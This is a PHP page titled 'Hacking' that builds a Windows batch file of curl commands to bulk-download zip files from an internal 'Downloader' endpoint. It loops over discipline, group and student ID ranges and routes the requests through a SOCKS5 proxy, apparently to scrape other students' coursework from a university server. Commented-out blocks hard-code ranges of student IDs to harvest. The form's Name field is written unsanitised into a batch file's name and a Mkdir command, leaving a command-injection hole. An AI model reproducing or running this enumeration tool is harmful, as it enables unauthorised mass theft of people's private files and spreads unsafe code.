<!doctype html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />


    <title>Hacking</title>
    <link href="css/bootstrap.css" rel="stylesheet">
</head>
<body>
<?php

        $Disc=(int)$_POST['Disc'];
        $Group=(int)$_POST['Group'];
        $Student=(int)$_POST['Student'];
        $Student2=(int)$_POST['Student2'];
        $Count=(int)$_POST['Count'];
        $Count2=(int)$_POST['Count2'];
        $Type=(int)$_POST['Type'];
        $Type2=(int)$_POST['Type2'];
        $num=(int)$_POST['num'];
        $num2=(int)$_POST['num2'];
        $Name=$_POST['Name'];

        $file = $Name.'.bat';
      $current = file_get_contents($file);
      $current.="Mkdir ".$Name."\n";
     

    //    if($Student==$Student2) $Student2=$Student;
    //    if($Count==$Count2) $Count2=$Count;
    //    if($Type==$Type2) $Type2=$Type;
    //    if($num==$num2) $num2=$num;

       while($Student<($Student2+1))
        { 
        while($Count<($Count2+1)) 
        {   
            while($Type<($Type2+1))
            {  
                while($num<($num2+1)) 
                {   
                            $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/".$Name."/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
                            $num=($num+1);
                } 
                $num=(int)$_POST['num'];
                $Type=($Type+1);   
            }
            $Count=($Count+1);
            $Type=(int)$_POST['Type'];
        }
        $Student=($Student+1);
        $Count=(int)$_POST['Count'];
        }
     $current .="pause";
     file_put_contents($file, $current);
     
//      $file = 'WEB2.txt';
//      $current = file_get_contents($file);
//      $current.="Mkdir Web2\n";
//     $Disc=46 ;
//        $Group=176;
//        for ($Student=2400; $Student <2470 ; $Student++) { 
//                for ($Count=1; $Count <4 ; $Count++) { 
//                    $Type=2;
//                        for ($num=0; $num <14 ; $num++) { 
//                            $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/Web2/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
//                        }
//                    }
//                }

//     $current .="pause";
//     file_put_contents($file, $current);

   
    
//     $file = 'BD.bat';
//     $current = file_get_contents($file);
//     $current.="Mkdir BD\n";
//    $Disc=204 ;
//       $Group=177;
//       for ($Student=2400; $Student <2470 ; $Student++) { 
//               for ($Count=1; $Count <4 ; $Count++) { 
//                   $Type=2;
//                       for ($num=0; $num <14 ; $num++) { 
//                           $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/BD/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
//                       }
//                   }
//               }

//    $current .="pause";
//    file_put_contents($file, $current);
// echo "final";

    ?> 
</body>
</html>



<!-- $file = 'people.txt';
      $current = file_get_contents($file);
      $current.="Mkdir file\n";
     for ($Disc=40; $Disc <50 ; $Disc++) { 
        for ($Group=176; $Group < 178; $Group++) { 
            for ($Student=2400; $Student <2500 ; $Student++) { 
               // $current = file_get_contents($file);
                for ($Count=0; $Count <5 ; $Count++) { 
                    for ($Type=0; $Type <10 ; $Type++) { 
                        for ($num=0; $num <20 ; $num++) { 
                           // $current.="Mkdir ";
                            $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/file/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
                        }
                    }
                }
               // file_put_contents($file, $current);
            }
        }
     }
     $current .="pause";
     file_put_contents($file, $current); -->